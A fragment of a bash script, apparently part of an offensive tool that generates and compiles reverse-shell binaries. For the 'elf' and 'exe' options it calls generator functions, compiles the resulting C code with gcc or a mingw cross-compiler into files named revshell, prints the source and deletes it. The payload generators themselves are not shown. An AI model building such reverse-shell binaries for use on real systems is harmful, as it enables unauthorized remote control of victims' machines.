...
function Shells(){
	...
	printf "[${COL_GREEN}+${COL_END}] elf\n"
	printf "[${COL_GREEN}+${COL_END}] exe\n"
...
then
#	printf "[ ${COL_GREEN}ELF${COL_END} ] [(reverse)]\n\n"
	_elf_ "$1" "$2" "$3"
        gcc elf.c -o revshell
        cat elf.c
	printf "[${COL_GREEN}+${COL_END}] Binary file is already compiled and stored in $PWD/revshell\n"
	rm elf.c

elif [[ "$1" == "exe" ]];
then
#       printf "[ ${COL_GREEN}EXE${COL_END} ] [(reverse)]\n\n"
        _exe_ "$1" "$2" "$3"
        i686-w64-mingw32-gcc exe.c -o revshell.exe -lws2_32
        cat exe.c
	printf "\n[${COL_GREEN}+${COL_END}] Binary file is already compiled and stored in $PWD/revshell.exe\n"
	rm exe.c
